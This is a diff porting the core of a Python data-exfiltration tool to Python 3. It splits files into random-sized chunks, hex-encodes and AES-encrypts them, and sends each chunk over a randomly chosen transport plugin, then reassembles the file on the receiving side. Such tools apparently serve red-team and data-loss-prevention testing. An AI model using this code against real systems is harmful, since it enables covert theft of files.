@@ -1,4 +1,3 @@
-from __future__ import print_function
 import os
 import random
 import threading
@@ -16,12 +15,15 @@ from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
-from plugins import dukpt
+import dukpt
+from binascii import unhexlify, hexlify
+import importlib
+import traceback
 
 try:
     from cStringIO import StringIO
 except ImportError:
-    from io import StringIO
+    from io import StringIO, BytesIO
 
 if getattr(sys, 'frozen', False):
     os.chdir(sys._MEIPASS)
@@ -64,7 +66,6 @@ def ok(message):
 def info(message):
     display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))
 
-
 # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
 def aes_encrypt(message, key=KEY):
     try:
@@ -78,14 +79,15 @@ def aes_encrypt(message, key=KEY):
         iv = os.urandom(AES.block_size)
 
         # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
 
         # Add PKCS5 padding
-        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode()
 
         # Return data size, iv and encrypted message
-        return iv + ksn + aes.encrypt(pad(message))
+        return iv + ksn.encode() + aes.encrypt(pad(message))
     except:
+        traceback.print_exc()
         return None
 
 def aes_decrypt(message, key=KEY):
@@ -100,7 +102,7 @@ def aes_decrypt(message, key=KEY):
             message = message[AES.block_size:]
 
         # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
         message = aes.decrypt(message)
 
         # Remove PKCS5 padding
@@ -108,14 +110,12 @@ def aes_decrypt(message, key=KEY):
 
         return unpad(message)
     except:
+        traceback.print_exc()
         return None
 
 # Do a md5sum of the file
 def md5(f):
-    hash = hashlib.md5()
-    for chunk in iter(lambda: f.read(4096), ""):
-        hash.update(chunk)
-    return hash.hexdigest()
+    return hashlib.md5(f.read()).hexdigest()
 
 
 function_mapping = {
@@ -137,15 +137,15 @@ class Exfiltration(object):
         self.results = results
         self.target = "127.0.0.1"
 
-        path = "plugins/"
+        path = "plugins"
         plugins = {}
 
         # Load plugins
-        sys.path.insert(0, path)
+        # sys.path.insert(0, path)
         for f in os.listdir(path):
             fname, ext = os.path.splitext(f)
-            if ext == '.py' and self.should_use_plugin(fname):
-                mod = __import__(fname)
+            if ext == '.py' and fname != '__init__' and self.should_use_plugin(fname):
+                mod = importlib.import_module(path + '.' + fname)
                 plugins[fname] = mod.Plugin(self, config["plugins"][fname])
 
     def should_use_plugin(self, plugin_name):
@@ -175,7 +175,7 @@ class Exfiltration(object):
             function_mapping[mode](message)
 
     def get_random_plugin(self):
-        plugin_name = random.sample(self.plugins, 1)[0]
+        plugin_name = random.sample(sorted(self.plugins), 1)[0]
         return plugin_name, self.plugins[plugin_name]['send']
 
     def use_plugin(self, plugins):
@@ -214,18 +214,19 @@ class Exfiltration(object):
         #Reorder packets before reassembling / ugly one-liner hack
         files[jobid]['packets_order'], files[jobid]['data'] = \
                 [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
-        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
+        content = ''.join(v for v in files[jobid]['data'])
+        content = unhexlify(content)
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
         try:
-            with open(filename, 'w') as f:
+            with open(filename, 'wb') as f:
                 f.write(content)
         except IOError as e:
             warning("Got %s: cannot save file %s" % filename)
             raise e
 
-        if (files[jobid]['checksum'] == md5(open(filename))):
+        if (files[jobid]['checksum'] == md5(open(filename, 'rb'))):
             ok("File %s recovered" % (fname))
         else:
             warning("File %s corrupt!" % (fname))
@@ -235,7 +236,7 @@ class Exfiltration(object):
     def retrieve_data(self, data):
         global files
         try:
-            message = data
+            message = data.decode()
             if (message.count("|!|") >= 2):
                 info("Received {0} bytes".format(len(message)))
                 message = message.split("|!|")
@@ -262,6 +263,7 @@ class Exfiltration(object):
                         if files[jobid]['packets_len'] == len(files[jobid]['data']):
                             self.retrieve_file(jobid)
         except:
+            traceback.print_exc()
             raise
             pass
 
@@ -281,16 +283,15 @@ class ExfiltrateFile(threading.Thread):
         # checksum
         if self.file_to_send == 'stdin':
             file_content = sys.stdin.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
+            buf = BytesIO(file_content)
+            e = BytesIO(file_content)
         else:
             with open(self.file_to_send, 'rb') as f:
                 file_content = f.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
+            buf = BytesIO(file_content)
+            e = BytesIO(file_content)
         self.checksum = md5(buf)
         del file_content
-
         # registering packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
         ok("Using {0} as transport method".format(plugin_name))
@@ -315,7 +316,7 @@ class ExfiltrateFile(threading.Thread):
 
         packet_index = 0
         while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
+            data_file = hexlify(f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ))).decode()
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
@@ -389,10 +390,10 @@ def main():
     if 'IPEK' in config:
         IPEK = config['IPEK']
         KSN  = config['KSN']
-        dukpt_client = dukpt.Client(IPEK.decode('hex'), KSN.decode('hex'))
+        dukpt_client = dukpt.Client(unhexlify(IPEK), unhexlify(KSN))
     elif 'BDK' in config:
         BDK  = config['BDK']
-        dukpt_server = dukpt.Server(BDK.decode('hex'))
+        dukpt_server = dukpt.Server(unhexlify(BDK))
     else:
         KEY  = config['AES_KEY']
     app = Exfiltration(results, KEY)
@@ -434,7 +435,7 @@ def main():
     for thread in threads:
         while True:
             thread.join(1)
-            if not thread.isAlive():
+            if not thread.is_alive():
                 break
 
 if __name__ == '__main__':
